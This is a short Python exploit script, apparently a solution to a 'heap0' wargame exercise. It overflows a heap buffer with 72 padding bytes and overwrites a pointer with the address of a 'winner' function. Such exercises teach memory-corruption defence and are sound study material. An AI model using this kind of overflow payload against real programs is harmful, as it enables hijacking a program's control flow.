#!/usr/bin/python
from struct import pack as p
#./heap0 `python /tmp/x.py`

winnerret = p("I", 0x08048464)

s = ''
s += 'A' * 72
s += winnerret

print s
